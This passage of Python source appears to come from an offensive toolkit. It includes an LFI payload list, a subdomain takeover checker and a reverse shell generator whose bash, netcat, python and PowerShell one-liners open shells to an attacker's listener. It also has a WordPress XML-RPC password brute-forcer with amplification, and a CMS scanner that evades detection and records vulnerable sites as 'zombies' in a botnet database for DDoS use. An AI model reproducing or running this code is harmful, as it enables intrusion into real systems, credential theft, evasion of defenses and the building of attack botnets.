    ("C:\\Windows\\win.ini", "Windows win.ini"),
    ("..\\..\\..\\..\\Windows\\system.ini", "Windows traversal"),
    ("php://filter/convert.base64-encode/resource=index.php", "PHP filter wrapper"),
    ("php://input", "PHP input wrapper"),
    ("file:///etc/passwd", "File protocol"),
    ("/var/log/apache2/access.log", "Apache access log"),
    ("/var/log/nginx/access.log", "Nginx access log"),
]

LFI_SIGNATURES = [
    "root:x:0:0", "root:*:0:0",        # /etc/passwd
    "daemon:x:", "bin:x:",              # /etc/passwd
    "[fonts]", "[extensions]",           # system.ini / win.ini
    "localhost", "127.0.0.1",            # /etc/hosts
    "HTTP_", "DOCUMENT_ROOT",            # /proc/self/environ
]


def lfi_tester():
    print_header("LFI / Path Traversal Tester")
    if not exploit_disclaimer():
        return

    url = prompt("Target URL with file param (e.g. http://target.com/page?file=about)")
    if not url:
        return

    parsed = urlparse(url)
    if "=" not in parsed.query:
        print_err("URL must contain a file/page parameter")
        return

    params = parsed.query.split("&")
    print(f"\n  {Y}Parameters found:{RST}")
    for i, p in enumerate(params):
        print(f"    {C}{i+1}.{RST} {p}")

    param_idx = input(f"\n  {Y}Select parameter to test (1-{len(params)}):{RST} ").strip()
    try:
        param_idx = int(param_idx) - 1
        if not (0 <= param_idx < len(params)):
            print_err("Invalid")
            return
    except ValueError:
        print_err("Invalid number")
        return

    param_name = params[param_idx].split("=")[0]
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (ARGUS Pentest)"})

    spinner("Testing LFI payloads...", 1.0)

    findings = []
    for payload, description in LFI_PAYLOADS:
        new_params = list(params)
        new_params[param_idx] = f"{param_name}={payload}"
        test_url = f"{base_url}?{'&'.join(new_params)}"

        try:
            resp = session.get(test_url, timeout=8)
            body = resp.text

            detected = False
            for sig in LFI_SIGNATURES:
                if sig in body:
                    print_err(f"{R}LFI FOUND{RST} — {description}")
                    print(f"       Payload: {W}{payload}{RST}")
                    # Show a snippet
                    idx = body.index(sig)
                    snippet = body[max(0, idx-20):idx+80].replace("\n", "\\n")
                    print(f"       Preview: {W}{snippet[:100]}{RST}")
                    findings.append((payload, description))
                    detected = True
                    break

            if not detected:
                print(f"  {C}  CLEAN{RST}  {description}")
        except Exception:
            pass

    print(f"\n  {Y}{'═' * 50}{RST}")
    if findings:
        print(f"  {R}Found {len(findings)} LFI vulnerability(ies)!{RST}")
    else:
        print_ok("No LFI vulnerabilities found with basic payloads")


# ─── 37. Subdomain Takeover Check ────────────────────────────────────────────

TAKEOVER_FINGERPRINTS = {
    "GitHub Pages": ["There isn't a GitHub Pages site here"],
    "Heroku": ["No such app", "no-such-app"],
    "AWS S3": ["NoSuchBucket", "The specified bucket does not exist"],
    "Shopify": ["Sorry, this shop is currently unavailable"],
    "Tumblr": ["There's nothing here", "Whatever you were looking for doesn't currently exist"],
    "WordPress.com": ["Do you want to register"],
    "Zendesk": ["Help Center Closed"],
    "Fastly": ["Fastly error: unknown domain"],
    "Pantheon": ["404 error unknown site"],
    "Unbounce": ["The requested URL was not found on this server"],
    "Surge.sh": ["project not found"],
    "Bitbucket": ["Repository not found"],
    "Ghost": ["The thing you were looking for is no longer here"],
    "Fly.io": ["404 Not Found"],
    "Netlify": ["Not Found - Request ID"],
    "Cargo": ["If you're moving your domain away from Cargo"],
    "Strikingly": ["page not found"],
    "Agile CRM": ["Sorry, this page is no longer available"],
}


def subdomain_takeover():
    print_header("Subdomain Takeover Check")
    if not exploit_disclaimer():
        return

    domain = prompt("Domain (will check subdomains via crt.sh)")
    if not domain:
        return

    spinner("Fetching subdomains from crt.sh...", 1.5)
    try:
        resp = requests.get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=15)
        data = resp.json()
        subdomains = set()
        for entry in data:
            for sub in entry.get("name_value", "").split("\n"):
                sub = sub.strip().lower()
                if sub.endswith(domain) and "*" not in sub:
                    subdomains.add(sub)
    except Exception as e:
        print_err(f"Could not fetch subdomains: {e}")
        return

    if not subdomains:
        print_warn("No subdomains found")
        return

    print_row("Subdomains Found", str(len(subdomains)))
    spinner("Checking for CNAME dangling...", 0.5)

    vulnerable = []
    for sub in sorted(subdomains):
        # Check CNAME
        cname = None
        if dns:
            try:
                answers = dns.resolver.resolve(sub, "CNAME")
                for rdata in answers:
                    cname = str(rdata.target).rstrip(".")
            except Exception:
                continue

        if not cname:
            continue

        # Check if CNAME target resolves
        try:
            if STEALTH["enabled"] and dns is not None:
                dns.resolver.resolve(cname, "A", lifetime=10)
            else:
                socket.gethostbyname(cname)
        except Exception:
            print_warn(f"{sub} -> {cname} (CNAME does not resolve!)")
            vulnerable.append((sub, cname, "NXDOMAIN"))
            continue

        # Check for takeover fingerprints
        try:
            resp = requests.get(f"http://{sub}", timeout=6, allow_redirects=True)
            body = resp.text
            for service, fingerprints in TAKEOVER_FINGERPRINTS.items():
                for fp in fingerprints:
                    if fp.lower() in body.lower():
                        print_err(f"{R}TAKEOVER POSSIBLE{RST}: {sub} -> {cname} ({service})")
                        vulnerable.append((sub, cname, service))
                        break
        except Exception:
            pass

    print(f"\n  {Y}{'═' * 50}{RST}")
    if vulnerable:
        print(f"  {R}Found {len(vulnerable)} potential takeover(s)!{RST}")
        for sub, cname, reason in vulnerable:
            print(f"    {R}•{RST} {sub} -> {cname} ({reason})")
    else:
        print_ok("No subdomain takeover opportunities found")


# ─── 38. Reverse Shell Generator ─────────────────────────────────────────────

def revshell_generator():
    print_header("Reverse Shell Generator")
    if not exploit_disclaimer():
        return

    ip = prompt("Your listener IP (LHOST)")
    if not ip:
        return
    port = prompt("Your listener port (LPORT)")
    if not port:
        return

    shells = {
        "Bash -i": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "Bash (alt)": f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
        "Python3": f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        "Python2": f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        "Perl": f'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")}};\'',
        "PHP": f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        "Ruby": f'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        "Netcat (traditional)": f"nc -e /bin/sh {ip} {port}",
        "Netcat (OpenBSD)": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "Netcat (busybox)": f"busybox nc {ip} {port} -e sh",
        "Lua": f'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{ip}\',\'{port}\');os.execute(\'/bin/sh -i <&3 >&3 2>&3\')"',
        "PowerShell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        "Java (Runtime)": f'Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]{{"/bin/bash","-c","bash -i >& /dev/tcp/{ip}/{port} 0>&1"}});p.waitFor();',
        "xterm": f"xterm -display {ip}:1",
        "socat": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
    }

    print(f"\n  {Y}Listener command:{RST}")
    print(f"  {G}nc -lvnp {port}{RST}")
    print(f"\n  {Y}Or with socat:{RST}")
    print(f"  {G}socat file:`tty`,raw,echo=0 tcp-listen:{port}{RST}")

    for name, payload in shells.items():
        print(f"\n  {M}── {name} ──{RST}")
        print(f"  {W}{payload}{RST}")

    print(f"\n  {Y}{'═' * 50}{RST}")
    print_warn("Remember to start your listener before executing the payload")
    print_warn("Use 'rlwrap nc -lvnp PORT' for a better shell experience")


# ─── XML-RPC Brute Force (inline for CMS scanner) ────────────────────────────

_XMLRPC_BF_USERNAMES = [
    "admin", "administrator", "editor", "author", "wordpress",
    "wp", "root", "test", "user", "manager", "webmaster",
    "demo", "guest", "info", "support", "contact",
]

_XMLRPC_BF_PASSWORDS = [
    "admin", "password", "123456", "12345678", "wordpress",
    "admin123", "password123", "root", "toor", "test",
    "123456789", "qwerty", "letmein", "welcome", "monkey",
    "master", "dragon", "login", "abc123", "admin1",
    "password1", "1234567890", "123123", "admin@123", "P@ssw0rd",
    "passw0rd", "iloveyou", "trustno1", "sunshine", "princess",
    "123456a", "654321", "admin1234", "pass123", "root123",
    "changeme", "1q2w3e4r", "qwerty123", "password!", "admin!",
]


def _cms_xmlrpc_bruteforce(url, xmlrpc_url, session, methods):
    """XML-RPC brute-force attack launched from CMS scanner when vuln is confirmed.
    Inherits the stealth session (rotating UA/headers) and adds its own evasion."""
    print(f"\n  {M}── XML-RPC Brute-Force Attack ──{RST}\n")

    custom_user = input(f"  {Y}Username to target (blank = common list):{RST} ").strip()
    usernames = [custom_user] if custom_user else _XMLRPC_BF_USERNAMES

    custom_pass_file = input(f"  {Y}Password file path (blank = built-in list):{RST} ").strip()
    passwords = list(_XMLRPC_BF_PASSWORDS)
    if custom_pass_file:
        try:
            with open(custom_pass_file, "r") as f:
                passwords = [line.strip() for line in f if line.strip()]
            print_ok(f"Loaded {len(passwords)} passwords from file")
        except Exception as e:
            print_err(f"Could not load file: {e}. Using built-in list.")

    use_multicall = "system.multicall" in methods
    batch_size = 5 if use_multicall else 1

    if use_multicall:
        print_ok(f"Using system.multicall amplification (batch size: {batch_size})")
    else:
        print_warn("system.multicall not available — single request per credential")

    total = len(usernames) * len(passwords)
    tested = 0
    found_creds = []
    req_count = 0  # track requests for periodic cookie flush

    print(f"  {Y}Testing {len(usernames)} username(s) x {len(passwords)} password(s) = {total} combinations{RST}\n")

    for username in usernames:
        if use_multicall:
            for i in range(0, len(passwords), batch_size):
                batch = passwords[i:i + batch_size]
                multicall = (
                    '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
                    '<params><param><value><array><data>'
                )
                for pwd in batch:
                    safe_user = username.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                    safe_pwd = pwd.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                    multicall += (
                        '<value><struct>'
                        '<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>'
                        '<member><name>params</name><value><array><data>'
                        f'<value><string>{safe_user}</string></value>'
                        f'<value><string>{safe_pwd}</string></value>'
                        '</data></array></value></member>'
                        '</struct></value>'
                    )
                multicall += '</data></array></value></param></params></methodCall>'

                try:
                    resp = session.post(xmlrpc_url, data=multicall,
                                        headers={"Content-Type": "text/xml"}, timeout=15)
                    if resp.status_code == 200:
                        call_results = re.findall(
                            r"<value>\s*(<array>.*?</array>|<struct>.*?</struct>)\s*</value>",
                            resp.text, re.DOTALL
                        )
                        for j, pwd in enumerate(batch):
                            tested += 1
                            if j < len(call_results):
                                chunk = call_results[j]
                                if "faultCode" not in chunk and ("isAdmin" in chunk or "blogName" in chunk or "blogid" in chunk):
                                    print(f"\n    {R}[CRED FOUND]{RST} {username}:{pwd}")
                                    found_creds.append((username, pwd))
                    else:
                        tested += len(batch)
                except Exception:
                    tested += len(batch)

                req_count += 1
                # Flush cookies every ~10 requests to break session tracking
                if req_count % 10 == 0:
                    session.cookies.clear()
                sys.stdout.write(f"\r  {Y}Progress: {tested}/{total} ({tested * 100 // max(total, 1)}%){RST}    ")
                sys.stdout.flush()
                # Jittered delay between batches
                _cms_jitter(0.3, 1.5)
        else:
            for pwd in passwords:
                tested += 1
                safe_user = username.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                safe_pwd = pwd.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                payload = (
                    '<?xml version="1.0"?>'
                    '<methodCall><methodName>wp.getUsersBlogs</methodName><params>'
                    f'<param><value><string>{safe_user}</string></value></param>'
                    f'<param><value><string>{safe_pwd}</string></value></param>'
                    '</params></methodCall>'
                )
                try:
                    resp = session.post(xmlrpc_url, data=payload,
                                        headers={"Content-Type": "text/xml"}, timeout=10)
                    if resp.status_code == 200 and "faultCode" not in resp.text:
                        if "isAdmin" in resp.text or "blogName" in resp.text or "blogid" in resp.text:
                            print(f"\n    {R}[CRED FOUND]{RST} {username}:{pwd}")
                            found_creds.append((username, pwd))
                except Exception:
                    pass

                req_count += 1
                if req_count % 10 == 0:
                    session.cookies.clear()
                sys.stdout.write(f"\r  {Y}Progress: {tested}/{total} ({tested * 100 // max(total, 1)}%){RST}    ")
                sys.stdout.flush()
                _cms_jitter(0.5, 2.0)

    print()
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Combinations tested", str(tested))
    print_row("Credentials found", str(len(found_creds)))
    if found_creds:
        print(f"\n  {R}[!!!] Valid credentials:{RST}")
        for u, p in found_creds:
            print(f"      {R}•{RST} {u} : {p}")
    else:
        print_ok("No valid credentials found with the tested combinations.")


# ─── 39. CMS Vulnerability Scanner ───────────────────────────────────────────

def _cms_stealth_session(target_url):
    """Create a requests.Session with anti-fingerprint measures for CMS scanning."""
    s = requests.Session()
    # Rotate full browser-like headers on every request via a hook
    def _rotate_headers(prepared, *args, **kwargs):
        hdrs = _random_stealth_headers()
        # Add organic Referer from target itself
        hdrs["Referer"] = target_url + "/"
        for k, v in hdrs.items():
            prepared.headers.setdefault(k, v)
        # Remove any header that screams "scanner"
        for bad in ("X-Requested-With",):
            prepared.headers.pop(bad, None)
    s.hooks["response"] = []  # clean slate
    # Use prepare-level hook: override at send time
    _orig_send = s.send
    def _patched_send(prepared, **kw):
        _rotate_headers(prepared)
        return _orig_send(prepared, **kw)
    s.send = _patched_send
    return s


def _cms_jitter(lo=0.3, hi=1.5):
    """Random sleep to break timing patterns."""
    time.sleep(random.uniform(lo, hi))


def _cms_scan_single(url, batch_mode=False):
    """Core CMS scan logic for a single URL. Returns list of findings.
    In batch_mode, brute-force prompts are skipped automatically."""

    session = _cms_stealth_session(url)
    try:
        return _cms_scan_single_inner(url, batch_mode, session)
    finally:
        session.close()


def _cms_scan_single_inner(url, batch_mode, session):
    spinner("Detecting CMS...", 1.0)

    # Detect CMS (with retry on timeout)
    cms = None
    max_retries = 3
    resp = None
    for attempt in range(1, max_retries + 1):
        try:
            resp = session.get(url, timeout=(15, 20))
            break
        except requests.exceptions.ConnectionError as e:
            if attempt < max_retries:
                wait = 3 * attempt
                print_warn(f"Connection failed (attempt {attempt}/{max_retries}), retrying in {wait}s...")
                time.sleep(wait)
            else:
                print_err(f"Could not reach target after {max_retries} attempts: {e}")
                return []
        except requests.exceptions.Timeout as e:
            if attempt < max_retries:
                wait = 3 * attempt
                print_warn(f"Timeout (attempt {attempt}/{max_retries}), retrying in {wait}s...")
                time.sleep(wait)
            else:
                print_err(f"Target timed out after {max_retries} attempts: {e}")
                return []
        except Exception as e:
            print_err(f"Could not reach target: {e}")
            return []

    if resp is None:
        print_err("Could not reach target.")
        return []

    try:
        body = resp.text.lower()
        headers = resp.headers

        if "wp-content" in body or "wp-includes" in body:
            cms = "WordPress"
        elif "joomla" in body or "/media/system/js/" in body:
            cms = "Joomla"
        elif "drupal" in body or "sites/all/" in body:
            cms = "Drupal"
        elif headers.get("X-Powered-By", "").lower().startswith("express"):
            cms = "Express.js"
        elif "shopify" in body:
            cms = "Shopify"
    except Exception as e:
        print_err(f"Error parsing response: {e}")
        return []

    if not cms:
        print_warn("Could not detect a known CMS. Running generic checks...")
        cms = "Generic"

    print_row("Detected CMS", cms)

    # CMS-specific checks
    checks = {
        "WordPress": [
            ("/wp-login.php", "Login page"),
            ("/wp-admin/", "Admin panel"),
            ("/xmlrpc.php", "XML-RPC (brute-force vector)"),
            ("/wp-json/wp/v2/users", "User enumeration API"),
            ("/wp-json/", "REST API root"),
            ("/wp-content/debug.log", "Debug log (info leak)"),
            ("/wp-config.php.bak", "Config backup"),
            ("/wp-config.php~", "Config editor backup"),
            ("/wp-config.php.save", "Config save file"),
            ("/wp-content/uploads/", "Uploads directory listing"),
            ("/?author=1", "Author enumeration"),
            ("/wp-includes/", "Includes directory"),
            ("/readme.html", "WP readme (version info)"),
            ("/license.txt", "License file"),
            ("/wp-cron.php", "WP-Cron"),
            ("/wp-content/plugins/", "Plugins directory"),
            ("/wp-content/themes/", "Themes directory"),
        ],
        "Joomla": [
            ("/administrator/", "Admin panel"),
            ("/configuration.php~", "Config backup"),
            ("/configuration.php.bak", "Config backup"),
            ("/robots.txt", "Robots.txt"),
            ("/README.txt", "Readme (version)"),
            ("/LICENSE.txt", "License"),
            ("/htaccess.txt", "Htaccess info"),
            ("/web.config.txt", "Web config"),
            ("/administrator/manifests/files/joomla.xml", "Version XML"),
            ("/language/en-GB/en-GB.xml", "Language version"),
            ("/plugins/system/cache/cache.xml", "Cache plugin"),
            ("/api/", "API endpoint"),
            ("/xmlrpc.php", "XML-RPC"),
        ],
        "Drupal": [
            ("/user/login", "Login page"),
            ("/admin/", "Admin panel"),
            ("/CHANGELOG.txt", "Changelog (version)"),
            ("/core/CHANGELOG.txt", "Core changelog"),
            ("/node/1", "Node access test"),
            ("/user/register", "Registration page"),
            ("/core/install.php", "Install script"),
            ("/update.php", "Update script"),
            ("/xmlrpc.php", "XML-RPC"),
            ("/sites/default/files/", "Default files"),
            ("/INSTALL.txt", "Install info"),
            ("/core/INSTALL.txt", "Core install info"),
        ],
    }

    paths = checks.get(cms, [
        ("/.git/HEAD", "Git repository"),
        ("/.env", "Environment file"),
        ("/.svn/entries", "SVN repository"),
        ("/composer.json", "Composer (PHP)"),
        ("/package.json", "NPM package"),
        ("/server-status", "Apache server status"),
        ("/server-info", "Apache server info"),
        ("/info.php", "PHP info"),
        ("/phpinfo.php", "PHP info"),
        ("/elmah.axd", ".NET error log"),
        ("/web.config", "IIS config"),
        ("/xmlrpc.php", "XML-RPC"),
    ])

    # Shuffle scan order to avoid signature-based detection
    paths = list(paths)
    random.shuffle(paths)

    spinner("Scanning known paths...", 0.5)
    findings = []

    def check_path(path_info):
        path, desc = path_info
        try:
            # Per-request jitter to break timing correlation
            time.sleep(random.uniform(0.2, 1.2))
            test_url = f"{url}{path}"
            # Session auto-rotates UA/headers via patched send
            resp = session.get(test_url, timeout=6, allow_redirects=False, stream=True)
            code = resp.status_code
            # Read only the first 1KB to check for sensitive content
            chunk = resp.raw.read(1024)
            resp.close()  # Release connection immediately
            preview = chunk.decode("utf-8", errors="replace")[:500]
            return path, desc, code, len(chunk), preview
        except Exception:
            return path, desc, 0, 0, ""

    # Reduced concurrency to lower WAF/IDS burst signature
    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as pool:
        futures = [pool.submit(check_path, p) for p in paths]
        try:
            for future in concurrent.futures.as_completed(futures, timeout=90):
                try:
                    path, desc, code, size, preview = future.result(timeout=15)
                except (concurrent.futures.TimeoutError, Exception):
                    continue
                if code == 200:
                    risk = ""
                    # Check for sensitive content
                    if any(s in preview.lower() for s in ["password", "db_", "secret", "key", "token"]):
                        risk = f" {R}[SENSITIVE DATA!]{RST}"
                    print_err(f"{G}200{RST}  {path:<40} {desc}{risk}")
                    findings.append((path, desc, "accessible"))
                elif code == 403:
                    print(f"  {Y}403{RST}  {path:<40} {desc} (exists but forbidden)")
                    findings.append((path, desc, "forbidden"))
                elif code in (301, 302):
                    print(f"  {C}{code}{RST}  {path:<40} {desc} (redirect)")
        except concurrent.futures.TimeoutError:
            print_warn("Path scan timed out — some paths were not checked")
            for f in futures:
                f.cancel()

    # WordPress-specific deep checks
    if cms == "WordPress":
        print(f"\n  {M}── WordPress Deep Checks ──{RST}")
        # Flush cookies between scan phases to break session correlation
        session.cookies.clear()
        _cms_jitter(0.8, 2.0)
        # Try user enumeration
        try:
            resp = session.get(f"{url}/wp-json/wp/v2/users", timeout=8)
            if resp.status_code == 200:
                users = resp.json()
                if isinstance(users, list) and users:
                    print_err(f"User enumeration possible! Found {len(users)} user(s):")
                    for u in users[:10]:
                        print(f"    {R}•{RST} {u.get('slug', 'N/A')} (ID: {u.get('id', '?')})")
        except Exception:
            pass

    # ── XML-RPC deep checks ──
    # For WordPress: always probe xmlrpc.php via POST (GET may return 405/redirect
    # even when the endpoint is fully active, since xmlrpc.php only accepts POST).
    # For other CMS: probe only if the path scan found it accessible.
    xmlrpc_found = any(f[0] == "/xmlrpc.php" for f in findings)
    if xmlrpc_found or cms == "WordPress":
        print(f"\n  {M}── XML-RPC Deep Checks ({cms}) ──{RST}")
        _cms_jitter(1.0, 2.5)
        session.cookies.clear()  # new session fingerprint for XML-RPC phase
        xmlrpc_url = f"{url}/xmlrpc.php"
        xmlrpc_active = False
        xmlrpc_methods = []
        try:
            resp = session.post(xmlrpc_url, timeout=8,
                                data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
                                headers={"Content-Type": "text/xml"})
            if resp.status_code == 200 and "methodResponse" in resp.text:
                xmlrpc_active = True
                xmlrpc_methods = re.findall(r"<string>(.*?)</string>", resp.text)
                print_err(f"XML-RPC enabled with {len(xmlrpc_methods)} methods (brute-force / DDoS vector)")
                findings.append(("/xmlrpc.php", "XML-RPC active", "confirmed"))

                # ── Active verification: system.multicall brute-force amplification ──
                multicall_vuln = False
                if "system.multicall" in xmlrpc_methods:
                    _cms_jitter(1.0, 3.0)
                    # Randomize probe usernames to avoid static signature
                    probe_u1 = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(5, 10)))
                    probe_p1 = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(6, 12)))
                    probe_p2 = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(6, 12)))
                    multicall_payload = (
                        '<?xml version="1.0"?>'
                        '<methodCall><methodName>system.multicall</methodName>'
                        '<params><param><value><array><data>'
                        '<value><struct>'
                        '<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>'
                        '<member><name>params</name><value><array><data>'
                        f'<value><string>{probe_u1}</string></value>'
                        f'<value><string>{probe_p1}</string></value>'
                        '</data></array></value></member>'
                        '</struct></value>'
                        '<value><struct>'
                        '<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>'
                        '<member><name>params</name><value><array><data>'
                        f'<value><string>{probe_u1}</string></value>'
                        f'<value><string>{probe_p2}</string></value>'
                        '</data></array></value></member>'
                        '</struct></value>'
                        '</data></array></value></param></params></methodCall>'
                    )
                    try:
                        mc_resp = session.post(xmlrpc_url, data=multicall_payload,
                                               headers={"Content-Type": "text/xml"}, timeout=10)
                        if mc_resp.status_code == 200 and "methodResponse" in mc_resp.text:
                            multicall_vuln = True
                            print(f"    {R}[VULN]{RST} system.multicall accepts batched auth — brute-force amplification CONFIRMED")
                            findings.append(("/xmlrpc.php", "Multicall brute-force", "confirmed"))
                        else:
                            print(f"    {G}[SAFE]{RST} system.multicall restricted or blocked")
                    except Exception:
                        pass

                # ── Active verification: pingback SSRF ──
                pingback_vuln = False
                if "pingback.ping" in xmlrpc_methods:
                    _cms_jitter(1.0, 3.0)
                    session.cookies.clear()
                    pingback_payload = (
                        '<?xml version="1.0"?>'
                        '<methodCall><methodName>pingback.ping</methodName><params>'
                        f'<param><value><string>http://127.0.0.1:80/</string></value></param>'
                        f'<param><value><string>{url}/?p=1</string></value></param>'
                        '</params></methodCall>'
                    )
                    try:
                        pb_resp = session.post(xmlrpc_url, data=pingback_payload,
                                               headers={"Content-Type": "text/xml"}, timeout=10)
                        if "faultCode" in pb_resp.text:
                            fault = re.search(r"<int>(\d+)</int>", pb_resp.text)
                            fc = fault.group(1) if fault else "?"
                            if fc == "0":
                                pingback_vuln = True
                                print(f"    {R}[VULN]{RST} Pingback SSRF — server accepts arbitrary outbound requests")
                                findings.append(("/xmlrpc.php", "Pingback SSRF", "confirmed"))
                            elif fc in ("17", "48"):
                                pingback_vuln = True
                                print(f"    {Y}[PARTIAL]{RST} Pingback processed (fault {fc}) — outbound request made, SSRF likely")
                                findings.append(("/xmlrpc.php", "Pingback SSRF partial", "likely"))
                            else:
                                print(f"    {Y}[INFO]{RST} Pingback returned fault code {fc}")
                        else:
                            pingback_vuln = True
                            print(f"    {R}[VULN]{RST} Pingback accepted without fault — SSRF confirmed")
                            findings.append(("/xmlrpc.php", "Pingback SSRF", "confirmed"))
                    except Exception:
                        pass

                # ── Active verification: username oracle ──
                if "wp.getUsersBlogs" in xmlrpc_methods:
                    _cms_jitter(1.0, 3.0)
                    session.cookies.clear()
                    # Random wrong password to avoid static payload signature
                    rand_pass = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(8, 14)))
                    oracle_payload = (
                        '<?xml version="1.0"?>'
                        '<methodCall><methodName>wp.getUsersBlogs</methodName><params>'
                        '<param><value><string>admin</string></value></param>'
                        f'<param><value><string>{rand_pass}</string></value></param>'
                        '</params></methodCall>'
                    )
                    try:
                        or_resp = session.post(xmlrpc_url, data=oracle_payload,
                                               headers={"Content-Type": "text/xml"}, timeout=10)
                        if "incorrect_password" in or_resp.text.lower() or "Incorrect password" in or_resp.text:
                            print(f"    {R}[VULN]{RST} Username oracle — user 'admin' EXISTS (server leaks 'Incorrect password')")
                            findings.append(("/xmlrpc.php", "Username oracle: admin exists", "confirmed"))
                        elif "Incorrect username" in or_resp.text:
                            print(f"    {Y}[INFO]{RST} Username oracle — user 'admin' does NOT exist")
                        elif "faultString" in or_resp.text:
                            print(f"    {Y}[INFO]{RST} wp.getUsersBlogs responds with error (login lockout or protection active)")
                    except Exception:
                        pass

                # ── High-risk method summary ──
                risk_map = {
                    "CRITICAL": ["wp.newPost", "wp.editPost", "wp.deletePost", "wp.uploadFile", "metaWeblog.newPost"],
                    "HIGH": ["pingback.ping", "system.multicall", "wp.getUsers", "wp.getOptions"],
                }
                crit = [m for m in risk_map["CRITICAL"] if m in xmlrpc_methods]
                high = [m for m in risk_map["HIGH"] if m in xmlrpc_methods]
                if crit:
                    print(f"    {R}[!!!] CRITICAL methods exposed:{RST} {', '.join(crit)}")
                if high:
                    print(f"    {R}[!] HIGH risk methods:{RST} {', '.join(high)}")

                # ── Save to botnet DB only if BOTH vectors CONFIRMED vulnerable ──
                ddos_vecs = []
                if pingback_vuln:
                    ddos_vecs.append("pingback.ping")
                if multicall_vuln:
                    ddos_vecs.append("system.multicall")
                if pingback_vuln and multicall_vuln:
                    # Check if already in DB before adding
                    existing = _botnet_db_load()
                    already_exists = any(z["url"] == url for z in existing)
                    _botnet_db_add(url, cms, ddos_vecs)
                    if already_exists:
                        print(f"    {C}[~]{RST} Zombie already in DB — updated vectors/last_seen")
                    else:
                        print(f"    {G}[+]{RST} New zombie saved to botnet DB → {os.path.basename(BOTNET_DB)}")

                # ── Offer brute-force attack (skip in batch mode) ──
                if not batch_mode:
                    print(f"\n    {Y}XML-RPC brute-force vector confirmed.{RST}")
                    run_bf = input(f"    {Y}Launch XML-RPC brute-force attack? (y/N):{RST} ").strip().lower()
                    if run_bf in ("y", "yes", "si", "s"):
                        _cms_xmlrpc_bruteforce(url, xmlrpc_url, session, xmlrpc_methods)
                else:
                    print(f"\n    {Y}XML-RPC brute-force vector confirmed (skipped in batch mode).{RST}")

        except Exception:
            pass

    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Findings", str(len(findings)))
    return findings


def cms_vuln_scanner():
    print_header("CMS Vulnerability Scanner")
    if not exploit_disclaimer():
        return

    print(f"\n  {C}[1]{RST} Single target")
    print(f"  {C}[2]{RST} Batch scan from .txt file (one URL per line)")
    mode = input(f"\n  {Y}Select mode [1/2]:{RST} ").strip()

    if mode == "2":
        # ── Batch mode ──
        file_path = input(f"\n  {Y}Path to .txt file:{RST} ").strip()
        if not file_path:
            print_err("No file path provided.")
            return
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                targets = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
        except FileNotFoundError:
            print_err(f"File not found: {file_path}")
            return
        except Exception as e:
            print_err(f"Error reading file: {e}")
            return

        if not targets:
            print_err("No targets found in file.")
            return

        # Normalize URLs
        normalized = []
        for t in targets:
            if not t.startswith(("http://", "https://")):
                t = "https://" + t
            normalized.append(t.rstrip("/"))
        targets = normalized

        # Load DB once to check for existing entries
        existing_db = _botnet_db_load()
        existing_urls = {z["url"] for z in existing_db}

        print(f"\n  {G}Loaded {len(targets)} target(s) from file{RST}")
        already_in_db = [t for t in targets if t in existing_urls]
        new_targets = [t for t in targets if t not in existing_urls]

        if already_in_db:
            print(f"  {C}[~]{RST} {len(already_in_db)} target(s) already in botnet DB — will scan but skip DB insert if unchanged")

        print(f"  {G}[>]{RST} Starting batch scan...\n")

        total_findings = 0
        vuln_count = 0

        for i, target_url in enumerate(targets, 1):
